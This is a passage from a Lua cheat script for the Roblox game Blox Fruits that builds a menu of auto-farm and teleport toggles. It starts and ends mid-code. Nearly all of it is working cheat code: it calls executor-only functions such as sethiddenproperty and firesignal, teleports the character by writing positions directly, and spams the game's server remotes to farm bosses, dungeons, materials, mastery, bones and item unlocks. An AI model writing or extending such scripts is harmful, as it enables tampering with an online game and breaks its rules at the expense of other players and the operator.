        local flag8 = arg and arg.Parent and arg:FindFirstChild("Humanoid") and arg:FindFirstChild("HumanoidRootPart") and arg.Humanoid.Health > 0
        return flag8
    end

    task.spawn(function()
        while task.wait() do
            if _G.autoboss and _G.FindBoss and not _G.allboss then
                pcall(function()
                    local findBoss2, enemies2, v30, v31, v32, v33, v34, v35, v36, v37, n3
                    n3 = 1

                    while true do
                        if n3 == 1 then
                            findBoss2 = _G.FindBoss
                            enemies2 = workspace.Enemies

                            if enemies2:FindFirstChild(findBoss2) then
                                n3 = 2
                            else
                                n3 = 8
                            end
                        elseif n3 == 2 then
                            v30 = fn25(findBoss2)

                            if _G.AcceptBossQuest then
                                n3 = 3
                            else
                                n3 = 4
                            end
                        elseif n3 == 3 then
                            fn27(v30)
                            n3 = 4
                        elseif n3 == 4 then
                            v31, v32, v33 = pairs(enemies2:GetChildren())
                            v34 = v33
                            n3 = 5
                        elseif n3 == 5 then
                            v35, v36 = v31(v32, v34)

                            if v35 == nil then
                                n3 = 10
                            else
                                n3 = 6
                            end
                        elseif n3 == 6 then
                            v34 = v35

                            if v36.Name == findBoss2 and fn28(v36) then
                                n3 = 7
                            else
                                n3 = 5
                            end
                        elseif n3 == 7 then
                            task.wait()
                            sethiddenproperty(localPlayer, "SimulationRadius", math.huge)
                            Kill(v36, true)

                            if _G.autoboss and v36.Parent and v36:FindFirstChild("Humanoid") and v36.Humanoid.Health > 0 and not _G.allboss then
                                n3 = 7
                            else
                                n3 = 5
                            end
                        elseif n3 == 8 then
                            v37 = game.ReplicatedStorage:FindFirstChild(findBoss2)

                            if v37 and v37:FindFirstChild("HumanoidRootPart") then
                                n3 = 9
                            else
                                n3 = 10
                            end
                        elseif n3 == 9 then
                            tween(v37.HumanoidRootPart.CFrame * CFrame.new(5, 10, 2))
                            n3 = 10
                        elseif n3 == 10 then
                            return
                        end
                    end
                end)
            end
        end
    end)

    v20:AddSection("Dungeon")

    v20:AddButton({
        Name = "Join Dungeon Map",
        Callback = function()
            local playerGui2 = Player:WaitForChild("PlayerGui")
            local v30 = WorldD
            local flag8 = true

            trongham = function()
                local flag9 = game.PlaceId == v30
                return flag9
            end

            Click = function(arg)
                if not arg or not arg.Parent then
                    return
                end

                pcall(function()
                    arg:Activate()
                end)

                pcall(function()
                    if firesignal and arg.Activated then
                        firesignal(arg.Activated)
                    end
                end)
            end

            task.spawn(function()
                while task.wait(0.3) and flag8 and not trongham() do
                    local uk = playerGui2:WaitForChild("Topbar"):WaitForChild("Frame"):WaitForChild("uk")
                    Click(uk)
                    local serverBrowser = playerGui2:WaitForChild("ServerBrowser")

                    repeat
                        task.wait()
                    until serverBrowser.Enabled ~= false

                    local dungeon = serverBrowser.Frame.TeleportButtons:WaitForChild("Dungeon")

                    for i = 1, 3 do
                        Click(dungeon)
                        task.wait(0.25)
                    end

                    flag8 = false
                end
            end)
        end,
    })

    if World2 or World3 then
        v20:AddToggle({
            Name = "Teleport To NPC Dungeon",
            Default = false,
            Callback = function(tpDung)
                _G.TpDung = tpDung
                if not _G.TpDung then
                    return
                end

                spawn(function()
                    while _G.TpDung do
                        wait(1)

                        pcall(function()
                            if World2 then
                                tween(CFrame.new(-6411.91748, 83.0275955, -4589.49512, 0.822660625, 6.88787267e-08, 0.568532765, -6.48893632e-08, 1, -2.72575367e-08, -0.568532765, -1.44680277e-08, 0.822660625))
                            elseif World3 then
                                tween(CFrame.new(-5020.69971, 315.040924, -2815.63843, -0.999763608, -3.2240417e-09, -0.0217427947, -3.92056965e-09, 1, 3.19922542e-08, 0.0217427947, 3.20699378e-08, -0.999763608))
                            end
                        end)
                    end
                end)
            end,
        })
    end

    if WorldD then
        local character3 = localPlayer.Character
        local humanoidRootPart2 = character3 and localPlayer.Character:FindFirstChild("HumanoidRootPart")
        local cframe = CFrame.new(-486.695129, 236.72699, -433.911255, 0.525738716, -2.85238748e-08, 0.850646138, 9.50205319e-08, 1, -2.5195078e-08, -0.850646138, 9.40748706e-08, 0.525738716)
        local cframe2 = CFrame.new(-367.731781, 236.72699, -447.590424, 0.99656415, -4.61465852e-08, 0.0828246772, 4.3463988e-08, 1, 3.41919026e-08, -0.0828246772, -3.04745313e-08, 0.99656415)
        local cframe3 = CFrame.new(-235.128204, 236.72699, -428.101196, 0.964725316, 2.52342183e-08, -0.263258487, -4.6127056e-08, 1, -7.31817664e-08, 0.263258487, 8.27436466e-08, 0.964725316)
        _G.TeleportGate1 = false
        _G.TeleportGate2 = false
        _G.TeleportGate3 = false
        _G.FD = false

        v20:AddToggle({
            Name = "Teleport To Translation Gate 1",
            Default = false,
            Callback = function(teleportGate1)
                _G.TeleportGate1 = teleportGate1
            end,
        })

        v20:AddToggle({
            Name = "Teleport To Translation Gate 2",
            Default = false,
            Callback = function(teleportGate2)
                _G.TeleportGate2 = teleportGate2
            end,
        })

        v20:AddToggle({
            Name = "Teleport To Translation Gate 3",
            Default = false,
            Callback = function(teleportGate3)
                _G.TeleportGate3 = teleportGate3
            end,
        })

        v20:AddToggle({
            Name = "Auto Farm Dungeon",
            Description = "Farm Mob + Farm Destroy + Next Floor + Next Shadow",
            Default = false,
            Callback = function(fd)
                _G.FD = fd
            end,
        })

        spawn(function()
            while wait(0.1) do
                if _G.TeleportGate1 and humanoidRootPart2 then
                    humanoidRootPart2.CFrame = cframe
                end

                if _G.TeleportGate2 and humanoidRootPart2 then
                    humanoidRootPart2.CFrame = cframe2
                end

                if _G.TeleportGate3 and humanoidRootPart2 then
                    humanoidRootPart2.CFrame = cframe3
                end
            end
        end)

        local localPlayer8 = Players3.LocalPlayer
        _G.DeathPause = false
        _G.RespawnHandling = false

        GetChar = function()
            return localPlayer8.Character
        end

        GetHRP = function()
            local v30 = GetChar()
            local humanoidRootPart3 = v30 and v30:FindFirstChild("HumanoidRootPart")
            return humanoidRootPart3
        end

        IsShadow = function(arg)
            local flag8 = arg.Name == "Blank Buddy" or string.find(arg.Name:lower(), "shadow")
            return flag8
        end

        IsDestroy = function(arg)
            local v30 = string.find(arg.Name:lower(), "pillar")
            local v31 = v30 or string.find(arg.Name:lower(), "heal") or string.find(arg.Name:lower(), "regen")
            return v31
        end

        GetNearestMob = function()
            local v30 = GetHRP()
            if not v30 then
                return
            end
            local v31 = nil
            local huge = math.huge

            for k, child in pairs(workspace.Enemies:GetChildren()) do
                local humanoid = child:FindFirstChild("Humanoid")
                local humanoidRootPart3 = child:FindFirstChild("HumanoidRootPart")

                if humanoid and humanoidRootPart3 and humanoid.Health > 0 and not IsShadow(child) and IsDestroy(child) then
                    local magnitude = (v30.Position - humanoidRootPart3.Position).Magnitude

                    if magnitude < huge then
                        huge = magnitude
                        v31 = child
                    end
                end
            end

            if v31 then
                return v31
            end

            for k, child in pairs(workspace.Enemies:GetChildren()) do
                local humanoid = child:FindFirstChild("Humanoid")
                local humanoidRootPart3 = child:FindFirstChild("HumanoidRootPart")

                if humanoid and humanoidRootPart3 and humanoid.Health > 0 and not IsShadow(child) then
                    local magnitude = (v30.Position - humanoidRootPart3.Position).Magnitude

                    if magnitude < huge then
                        huge = magnitude
                        v31 = child
                    end
                end
            end

            return v31
        end

        GetNearestExit = function()
            local v30 = GetHRP()
            if not v30 then
                return
            end
            local map = workspace.Map
            local dungeon = map and workspace.Map:FindFirstChild("Dungeon")
            if not dungeon then
                return
            end
            local v31 = nil
            local huge = math.huge

            for k, child in pairs(dungeon:GetChildren()) do
                local exitTeleporter = child:FindFirstChild("ExitTeleporter")
                local root = exitTeleporter and exitTeleporter:FindFirstChild("Root")

                if root then
                    local magnitude = (v30.Position - root.Position).Magnitude

                    if magnitude < huge then
                        huge = magnitude
                        v31 = root
                    end
                end
            end

            return v31
        end

        localPlayer8.CharacterAdded:Connect(function()
            _G.DeathPause = true
            _G.RespawnHandling = true
            task.wait(0.5)
            local v30

            repeat
                v30 = GetHRP()
                task.wait(0.1)
            until v30

            if _G.FD then
                local v31 = GetNearestExit()

                if v31 then
                    tween(v31.CFrame * CFrame.new(0, 3, 0))
                end
            end

            task.wait(0.6)
            _G.DeathPause = false
            _G.RespawnHandling = false
        end)

        task.spawn(function()
            local v30, v31, n3
            n3 = 1

            while true do
                if n3 == 1 then
                    if task.wait(0.05) then
                        n3 = 2
                    else
                        n3 = 8
                    end
                elseif n3 == 2 then
                    if _G.FD and not _G.DeathPause and not _G.RespawnHandling and GetHRP() then
                        n3 = 3
                    else
                        n3 = 1
                    end
                elseif n3 == 3 then
                    v30 = GetNearestMob()

                    if v30 then
                        n3 = 4
                    else
                        n3 = 6
                    end
                elseif n3 == 4 then
                    task.wait()

                    if _G.FD and not _G.DeathPause and not _G.RespawnHandling and v30.Parent and v30.Humanoid.Health > 0 then
                        n3 = 5
                    else
                        n3 = 1
                    end
                elseif n3 == 5 then
                    Kill(v30, _G.FD)
                    n3 = 4
                elseif n3 == 6 then
                    v31 = GetNearestExit()

                    if v31 then
                        n3 = 7
                    else
                        n3 = 1
                    end
                elseif n3 == 7 then
                    tween(v31.CFrame * CFrame.new(0, 3, 0))
                    task.wait(1)
                    n3 = 1
                elseif n3 == 8 then
                    return
                end
            end
        end)

        v20:AddSection("Dungeon Card")
        _G.SelectCard = {}
        _G.AutoPickCard = false

        v20:AddDropdown({
            Name = "Select Card",
            Options = tbl3,
            MultiSelect = true,
            Default = {},
            Callback = function(selectCard)
                _G.SelectCard = selectCard
            end,
        })

        v20:AddToggle({
            Name = "Auto Pick Card",
            Default = false,
            Callback = function(autoPickCard)
                _G.AutoPickCard = autoPickCard
            end,
        })

        PickCard = function()
            local selectCard = _G.SelectCard
            local v30, v31, v32 = pairs(game.Players.LocalPlayer.PlayerGui:GetChildren())
            local v33 = v32
            local v34 = v30
            local v35 = v31

            while true do
                local v36, v37 = v34(v35, v33)
                if v36 == nil then
                    break
                end
                v33 = v36

                if v37.Name == "ScreenGui" and v37:FindFirstChild("1") and v37["1"]:FindFirstChild("2") then
                    local ok, result = pcall(function()
                        return v37["1"]["2"].DisplayName.Text
                    end)

                    if ok and result ~= "" then
                        if #selectCard == 0 then
                            pcall(function()
                                firesignal(v37["1"]["2"].Activated)
                            end)
                        else
                            for k, v38 in pairs(selectCard) do
                                if v38 == result then
                                    pcall(function()
                                        firesignal(v37["1"]["2"].Activated)
                                    end)
                                end
                            end

                            v33 = v36
                        end
                    end
                end
            end
        end

        task.spawn(function()
            while task.wait(0.3) do
                if _G.AutoPickCard then
                    PickCard()
                end
            end
        end)

        game.Players.LocalPlayer.PlayerGui.ChildAdded:Connect(function()
            if _G.AutoPickCard then
                task.wait(0.1)
                PickCard()
            end
        end)
    end

    v20:AddSection("Chest")

    v20:AddToggle({
        Name = "Auto Chest [ Tween ]",
        Default = GetSetting("collectruong", false),
        Callback = function(collectruong)
            _G.collectruong = collectruong
            _G.SaveData.collectruong = collectruong
            SaveSettings()
        end,
    })

    spawn(function()
        while wait() do
            if _G.collectruong then
                pcall(function()
                    local CollectionService = game:GetService("CollectionService")
                    local character3 = Player.Character
                    local result = character3 or Player.CharacterAdded:Wait()
                    if not result then
                        return
                    end
                    local position = result:GetPivot().Position
                    local tagged = CollectionService:GetTagged("_ChestTagged")
                    local huge = math.huge
                    local v30 = nil

                    for i = 1, #tagged do
                        local v31 = tagged[i]
                        local magnitude = (v31:GetPivot().Position - position).Magnitude

                        if (not SelectedIsland or v31:IsDescendantOf(SelectedIsland)) and not v31:GetAttribute("IsDisabled") and magnitude < huge then
                            huge = magnitude
                            v30 = v31
                        end
                    end

                    if v30 then
                        tween(v30:GetPivot())
                        local humanoid = result:FindFirstChild("Humanoid")

                        if humanoid then
                            task.delay(0.1, function()
                                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                                task.wait(0.15)
                                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                            end)
                        end
                    end
                end)
            end
        end
    end)

    v20:AddSection("Materials")

    v20:AddDropdown({
        Name = "Choose Material",
        Default = GetSetting("SelectMaterial", MaterialList[1]),
        Options = MaterialList,
        Callback = function(selectMaterial)
            getgenv().SelectMaterial = selectMaterial
            _G.SaveData.SelectMaterial = selectMaterial
            SaveSettings()
        end,
    })

    v20:AddToggle({
        Name = "Auto Farm Material",
        Default = GetSetting("AutoMaterial", false),
        Callback = function(autoMaterial)
            getgenv().AutoMaterial = autoMaterial
            _G.SaveData.AutoMaterial = autoMaterial
            SaveSettings()
        end,
    })

    spawn(function()
        processEnemy = function(arg, arg2)
            if arg:FindFirstChild("Humanoid") and arg:FindFirstChild("HumanoidRootPart") and arg.Humanoid.Health > 0 and arg.Name == arg2 then
                repeat
                    wait()
                    Kill(arg, getgenv().AutoMaterial)
                until not getgenv().AutoMaterial or not arg.Parent or arg.Humanoid.Health <= 0
            end
        end

        handleEnemySpawns = function()
            local v30, v31, v32 = pairs(game:GetService("Workspace")._WorldOrigin.EnemySpawns:GetChildren())
            local v33 = v32
            local v34 = v30
            local v35 = v31

            while true do
                local v36, v37 = v34(v35, v33)
                if v36 == nil then
                    break
                end

                for i, v38 in ipairs(MMon) do
                    if string.find(v37.Name, v38) and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v37.Position).Magnitude >= 10 then
                        tween(v37.CFrame * Pos)
                    end
                end

                v33 = v36
            end
        end

        while wait() do
            if getgenv().AutoMaterial then
                pcall(function()
                    if getgenv().SelectMaterial then
                        MaterialMon(getgenv().SelectMaterial)
                        tween(MPos)
                    end

                    local v30, v31, v32 = ipairs(MMon)
                    local v33 = v32
                    local v34 = v30
                    local v35 = v31

                    while true do
                        local v36, v37 = v34(v35, v33)
                        if v36 == nil then
                            break
                        end

                        for k, child in pairs(workspace.Enemies:GetChildren()) do
                            processEnemy(child, v37)
                        end

                        v33 = v36
                    end

                    handleEnemySpawns()
                end)
            end
        end
    end)

    v20:AddSection("Mastery")

    v20:AddSlider({
        Name = "Select Enemy Health [ % ]",
        Min = 5,
        Max = 90,
        Default = GetSetting("mau", 15),
        Increase = 1,
        Callback = function(maumon)
            _G.Maumon = maumon
            _G.SaveData.mau = maumon
            SaveSettings()
        end,
    })

    v20:AddDropdown({
        Name = "Select Tool",
        Default = GetSetting("SelectToolMastery", "Blox Fruit"),
        Options = {"Blox Fruit", "Gun"},
        Callback = function(selectToolMastery)
            _G.SelectToolMastery = selectToolMastery
            _G.SaveData.SelectToolMastery = selectToolMastery
            SaveSettings()
        end,
    })

    v20:AddToggle({
        Name = "Auto Farm Mastery",
        Default = GetSetting("farmmas", false),
        Callback = function(farmmas)
            _G.farmmas = farmmas
            _G.SaveData.farmmas = farmmas
            SaveSettings()
        end,
    })

    v20:AddToggle({
        Name = "Auto Mastery All Sword",
        Default = GetSetting("masfullsw", false),
        Callback = function(masfullsw)
            _G.masfullsw = masfullsw
            _G.SaveData.masfullsw = masfullsw
            SaveSettings()
        end,
    })

    v20:AddToggle({
        Name = "Aim Skill Mob",
        Default = GetSetting("AimSkillMob", true),
        Callback = function(aimSkillMob)
            _G.AimSkillMob = aimSkillMob
            _G.SaveData.AimSkillMob = aimSkillMob
            SaveSettings()
        end,
    })

    spawn(function()
        RunSer.RenderStepped:Connect(function()
            pcall(function()
                if _G.farmmas or _G.masfullsw then
                    for k, child in pairs(localPlayer.PlayerGui.Notifications:GetChildren()) do
                        if child.Name == "NotificationTemplate" and string.find(child.Text, "Skill locked!") then
                            child:Destroy()
                        end
                    end
                end
            end)
        end)
    end)

    FarmMasteryFunc = function()
        while _G.farmmas do
            pcall(function()
                if ShouldPauseForStack and ShouldPauseForStack() then
                    HandleStackTarget()
                    return
                end
                local character3 = localPlayer.Character
                local result = character3 or localPlayer.CharacterAdded:Wait()
                result:WaitForChild("HumanoidRootPart")
                local value = localPlayer.Data.Level.Value
                local quest = localPlayer.PlayerGui.Main.Quest
                local visible = quest.Visible
                local text = visible and quest.Container.QuestTitle.Title.Text or ""

                if World3 and value >= 2600 and not IsInSubmergedIsland() then
                    tween(CFrame.new(-16269.7041, 25.2288494, 1373.65955))

                    repeat
                        task.wait(0.2)
                        ReplicatedStorage.Modules.Net:FindFirstChild("RF/SubmarineWorkerSpeak"):InvokeServer("TravelToSubmergedIsland")
                    until IsInSubmergedIsland() or not _G.farmmas

                    return
                end

                if quest.Visible and not string.find(text, QuestNeta()[5]) then
                    ReplicatedStorage.Remotes.CommF_:InvokeServer("AbandonQuest")
                    task.wait(0.2)
                end

                if quest.Visible then
                    local v30 = QuestNeta()[1]
                    local v31 = nil

                    for k, child in pairs(workspace.Enemies:GetChildren()) do
                        if index.Alive(child) and child.Name == v30 then
                            v31 = child
                            break
                        end
                    end

                    if v31 then
                        local maxHealth = v31.Humanoid.MaxHealth
                        local maumon = _G.Maumon
                        local n3 = maumon or 70
                        HealthM = maxHealth * n3 / 100

                        repeat
                            task.wait()

                            if _G.AimSkillMob then
                                MousePos = v31.HumanoidRootPart.Position
                            end

                            if _G.SelectToolMastery == "Blox Fruit" then
                                index.Mas(v31, _G.farmmas)
                            elseif _G.SelectToolMastery == "Gun" then
                                index.Masgun(v31, _G.farmmas)
                            end
                        until not _G.farmmas or not v31.Parent or v31.Humanoid.Health <= 0 or not quest.Visible
                    else
                        tween(QuestNeta()[4])
                    end
                else
                    local v30 = QuestNeta()

                    if _G.DelayQuest then
                        task.wait(5)
                    end

                    tween(v30[6])
                    task.wait(0.8)
                    ReplicatedStorage.Remotes.CommF_:InvokeServer("StartQuest", v30[3], v30[2])
                end
            end)

            task.wait(0.15)
        end
    end

    FarmMasteryAllSwordFunc = function()
        while _G.masfullsw do
            pcall(function()
                local character3 = localPlayer.Character
                local result = character3 or localPlayer.CharacterAdded:Wait()
                result:WaitForChild("HumanoidRootPart")
                local value = localPlayer.Data.Level.Value
                local quest = localPlayer.PlayerGui.Main.Quest
                local visible = quest.Visible
                local text = visible and quest.Container.QuestTitle.Title.Text or ""

                if World3 and value >= 2600 and not IsInSubmergedIsland() then
                    tween(CFrame.new(-16269.7041, 25.2288494, 1373.65955))

                    repeat
                        task.wait(0.2)
                        ReplicatedStorage.Modules.Net:FindFirstChild("RF/SubmarineWorkerSpeak"):InvokeServer("TravelToSubmergedIsland")
                    until IsInSubmergedIsland() or not _G.masfullsw

                    return
                end

                local v30 = next
                local response, v31 = ReplicatedStorage.Remotes.CommF_:InvokeServer("getInventory")

                for k, v32 in v30, response, v31 do
                    if not _G.masfullsw then
                        break
                    end

                    if type(v32) == "table" and v32.Type == "Sword" then
                        SwordName = v32.Name

                        if tonumber(v32.Mastery) >= 1 and tonumber(v32.Mastery) <= 599 then
                            if not LayItems(SwordName) then
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("LoadItem", SwordName)
                                task.wait(0.3)
                            end

                            if quest.Visible and not string.find(text, QuestNeta()[5]) then
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("AbandonQuest")
                                task.wait(0.2)
                            end

                            if quest.Visible then
                                local v33 = QuestNeta()[1]
                                local v34 = nil

                                for k2, child in pairs(workspace.Enemies:GetChildren()) do
                                    if index.Alive(child) and child.Name == v33 then
                                        v34 = child
                                        break
                                    end
                                end

                                if v34 then
                                    local maxHealth = v34.Humanoid.MaxHealth
                                    local maumon = _G.Maumon
                                    local n3 = maumon or 70
                                    HealthM = maxHealth * n3 / 100

                                    repeat
                                        task.wait()

                                        if _G.AimSkillMob then
                                            MousePos = v34.HumanoidRootPart.Position
                                        end

                                        index.Sword(v34, _G.masfullsw)
                                    until not _G.masfullsw or not v34.Parent or v34.Humanoid.Health <= 0 or not quest.Visible
                                else
                                    tween(QuestNeta()[4])
                                end
                            else
                                local v33 = QuestNeta()

                                if _G.DelayQuest then
                                    task.wait(5)
                                end

                                tween(v33[6])
                                task.wait(0.8)
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("StartQuest", v33[3], v33[2])
                            end
                        elseif tonumber(v32.Mastery) >= 600 and not LayItems(SwordName) then
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("LoadItem", SwordName)
                            task.wait(0.3)
                        end

                        break
                    end

                    continue
                end
            end)

            task.wait(0.15)
        end
    end

    spawn(function()
        while wait(1) do
            if _G.farmmas and not _G.FarmMasteryRunning then
                _G.FarmMasteryRunning = true
                FarmMasteryFunc()
            elseif not _G.farmmas then
                _G.FarmMasteryRunning = false
            end

            if _G.masfullsw and not _G.FarmMasteryAllSwordRunning then
                _G.FarmMasteryAllSwordRunning = true
                FarmMasteryAllSwordFunc()
            elseif not _G.masfullsw then
                _G.FarmMasteryAllSwordRunning = false
            end
        end
    end)

    if World3 then
        v20:AddSection("Bones")

        v20:AddToggle({
            Name = "Auto Farm Bones",
            Default = GetSetting("bonefarm", false),
            Callback = function(bonefarm)
                _G.bonefarm = bonefarm
                _G.SaveData.bonefarm = bonefarm
                SaveSettings()
            end,
        })

        bonefarmFunc = function()
            local vector = Vector3.new(-9509.15332, 307.170349, 6190.64258)

            local tbl15 = {
                "Reborn Skeleton",
                "Living Zombie",
                "Demonic Soul",
                "Possessed Mummy",
            }

            while _G.bonefarm do
                pcall(function()
                    if ShouldPauseForStack and ShouldPauseForStack() then
                        HandleStackTarget()
                        return
                    end
                    local character3 = localPlayer2.Character
                    local humanoidRootPart2 = character3 and character3:FindFirstChild("HumanoidRootPart")
                    if not humanoidRootPart2 then
                        return
                    end
                    local humanoid = character3:FindFirstChild("Humanoid")
                    if not humanoid or humanoid.Health <= 0 then
                        return
                    end
                    local quest = localPlayer2.PlayerGui.Main.Quest

                    if (humanoidRootPart2.Position - vector).Magnitude > 1200 then
                        tween(CFrame.new(vector))
                        task.wait(1)
                        return
                    end

                    if _G.AcceptQuestC and not quest.Visible then
                        if _G.DelayQuest then
                            task.wait(5)
                        end

                        local cframe = CFrame.new(-9516.99316, 172.017181, 6078.46533)
                        tween(cframe)
                        local n3 = 0
                        local n4

                        repeat
                            task.wait(0.2)
                            n4 = n3 + 0.2
                            n3 = n4
                        until (cframe.Position - humanoidRootPart2.Position).Magnitude <= 50 or n4 > 8

                        local n5 = math.random(1, 4)

                        ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(({
                            {"StartQuest", "HauntedQuest2", 2},
                            {"StartQuest", "HauntedQuest2", 1},
                            {"StartQuest", "HauntedQuest1", 1},
                            {"StartQuest", "HauntedQuest1", 2},
                        })[n5]))

                        task.wait(0.3)
                        return
                    end

                    local v30 = nil
                    local huge = math.huge

                    for k, child in pairs(workspace.Enemies:GetChildren()) do
                        local humanoidRootPart3 = child:FindFirstChild("HumanoidRootPart")
                        local humanoid2 = child:FindFirstChild("Humanoid")

                        if humanoidRootPart3 and humanoid2 and humanoid2.Health > 0 and table.find(tbl15, child.Name) and (humanoidRootPart3.Position - vector).Magnitude <= 1200 then
                            local magnitude = (humanoidRootPart2.Position - humanoidRootPart3.Position).Magnitude

                            if magnitude < huge then
                                huge = magnitude
                                v30 = child
                            end
                        end
                    end

                    if v30 then
                        repeat
                            task.wait()
                            if ShouldPauseForStack and ShouldPauseForStack() then
                                break
                            end
                            Kill(v30, _G.bonefarm)
                        until not _G.bonefarm or not v30.Parent or v30.Humanoid.Health <= 0 or _G.AcceptQuestC and not quest.Visible
                    else
                        tween(CFrame.new(vector))
                        task.wait(1)
                    end
                end)

                task.wait(0.05)
            end
        end

        v20:AddToggle({
            Name = "Auto Kill Soul Reaper",
            Default = GetSetting("farmsc", false),
            Callback = function(farmsc)
                _G.farmsc = farmsc
                _G.SaveData.farmsc = farmsc
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(Sec) do
                if _G.farmsc then
                    pcall(function()
                        local v30 = MobCheck("Soul Reaper")

                        if v30 then
                            repeat
                                task.wait()
                                Kill(v30, _G.farmsc)
                            until v30.Humanoid.Health <= 0 or _G.farmsc == false
                        elseif LayItems("Hallow Essence") then
                            repeat
                                wait(0.1)
                                tween(CFrame.new(-8932.322265625, 146.83154296875, 6062.55078125))
                            until _G.farmsc == false or localPlayer.Character.HumanoidRootPart.CFrame == CFrame.new(-8932.322265625, 146.83154296875, 6062.55078125)

                            EquipWeapon("Hallow Essence")
                        else
                            repeat
                                task.wait(0.1)
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("Bones", "Buy", 1, 1)
                            until _G.farmsc == false or LayItems("Hallow Essence")
                        end
                    end)
                end
            end
        end)

        v20:AddToggle({
            Name = "Auto Trade Bones",
            Default = GetSetting("Auto_Random_Bone", false),
            Callback = function(autoRandomBone)
                _G.Auto_Random_Bone = autoRandomBone
                _G.SaveData.Auto_Random_Bone = autoRandomBone
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(Sec) do
                pcall(function()
                    if _G.Auto_Random_Bone then
                        repeat
                            task.wait()
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("Bones", "Buy", 1, 1)
                        until not _G.Auto_Random_Bone
                    end
                end)
            end
        end)

        v20:AddToggle({
            Name = "Auto Pray Gravestone",
            Default = GetSetting("caunguyen", false),
            Callback = function(caunguyen)
                _G.caunguyen = caunguyen
                _G.SaveData.caunguyen = caunguyen
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(Sec) do
                if _G.caunguyen then
                    local cframe = CFrame.new(-8761.3154296875, 164.85829162598, 6161.1567382813)

                    if localPlayer.Character.HumanoidRootPart.CFrame == cframe then
                        if localPlayer.Character.HumanoidRootPart.CFrame == cframe then
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("gravestoneEvent", 2)
                        end
                    else
                        tween(CFrame.new(-8761.3154296875, 164.85829162598, 6161.1567382813))
                    end
                end
            end
        end)

        v20:AddToggle({
            Name = "Auto Try Luck",
            Default = GetSetting("tryluck", false),
            Callback = function(tryluck)
                _G.tryluck = tryluck
                _G.SaveData.tryluck = tryluck
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(Sec) do
                if _G.tryluck then
                    local cframe = CFrame.new(-8761.3154296875, 164.85829162598, 6161.1567382813)

                    if localPlayer.Character.HumanoidRootPart.CFrame == cframe then
                        if localPlayer.Character.HumanoidRootPart.CFrame == cframe then
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("gravestoneEvent", 1)
                        end
                    else
                        tween(CFrame.new(-8761.3154296875, 164.85829162598, 6161.1567382813))
                    end
                end
            end
        end)
    end

    if World2 or World3 then
        v4:AddSection("Unlocked Chip")
    end

    if World3 then
        v4:AddToggle({
            Name = "Auto Unlock Dough Chip",
            Default = GetSetting("Doughv2", false),
            Callback = function(doughv2)
                _G.Doughv2 = doughv2
                _G.SaveData.Doughv2 = doughv2
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(Sec) do
                if _G.Doughv2 then
                    pcall(function()
                        if workspace.Map.CakeLoaf:FindFirstChild("RedDoor") then
                            if workspace.Map.CakeLoaf:FindFirstChild("RedDoor") then
                                if LayItems("Red Key") then
                                    repeat
                                        wait()
                                        tween(CFrame.new(-2681.97998, 64.3921585, -12853.7363, 0.149007782, -1.87902192e-08, 0.98883605, 3.60619588e-08, 1, 1.35681812e-08, -0.98883605, 3.36376011e-08, 0.149007782))
                                    until not _G.Doughv2 or (localPlayer.Character.HumanoidRootPart.CFrame - CFrame.new(-2681.97998, 64.3921585, -12853.7363, 0.149007782, -1.87902192e-08, 0.98883605, 3.60619588e-08, 1, 1.35681812e-08, -0.98883605, 3.36376011e-08, 0.149007782)).Magnitude <= 5

                                    EquipWeapon("Red Key")
                                end
                            elseif MobCheck("Dough King") then
                                local v30 = MobCheck("Dough King")

                                if v30 then
                                    repeat
                                        wait()
                                        Kill(v30, _G.Doughv2)
                                    until not _G.Doughv2 or not v30.Parent or v30.Humanoid.Health <= 0
                                else
                                    tween(CFrame.new(-1943.676513671875, 251.5095672607422, -12337.880859375))
                                end
                            end
                        elseif LayItems("Red Key") then
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("CakeScientist", "Check")
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("RaidsNpc", "Check")
                        end

                        if LayItems("Sweet Chalice") then
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("CakePrinceSpawner", true)
                            _G.doughking = true
                        else
                            _G.doughking = false
                        end

                        if LayItems("God's Chalice") and LayMaterial("Conjured Cocoa") >= 10 then
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("SweetChaliceNpc")
                        end

                        if localPlayer.Backpack:FindFirstChild("God's Chalice") and not localPlayer.Character:FindFirstChild("God's Chalice") then
                            _G.farmelite = false
                        else
                            _G.farmelite = true
                        end

                        if LayMaterial("Conjured Cocoa") <= 10 then
                            local v30 = MobCheck({"Cocoa Warrior", "Chocolate Bar Battler"})

                            if v30 then
                                repeat
                                    wait()
                                    Kill(v30, _G.Doughv2)
                                until _G.Doughv2 == false or not v30.Parent or v30.Humanoid.Health <= 0
                            else
                                tween(CFrame.new(402.7189025878906, 81.06050109863281, -12259.54296875))
                            end
                        end
                    end)
                end
            end
        end)
    end

    if World2 or World3 then
        v4:AddToggle({
            Name = "Auto Unlock Phoenix Chip",
            Default = GetSetting("AutoPhoenixF", false),
            Callback = function(autoPhoenixF)
                _G.AutoPhoenixF = autoPhoenixF
                _G.SaveData.AutoPhoenixF = autoPhoenixF
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(0.1) do
                if _G.AutoPhoenixF then
                    pcall(function()
                        if LayItems("Bird-Bird: Phoenix") then
                            if localPlayer.Backpack:FindFirstChild(localPlayer.Data.DevilFruit.Value) then
                                if localPlayer.Backpack:FindFirstChild(localPlayer.Data.DevilFruit.Value).Level.Value >= 400 then
                                    tween(CFrame.new(-2812.76708984375, 254.803466796875, -12595.560546875))

                                    if (CFrame.new(-2812.76708984375, 254.803466796875, -12595.560546875).Position - localPlayer.Character.HumanoidRootPart.Position).Magnitude <= 10 then
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("SickScientist", "Check")
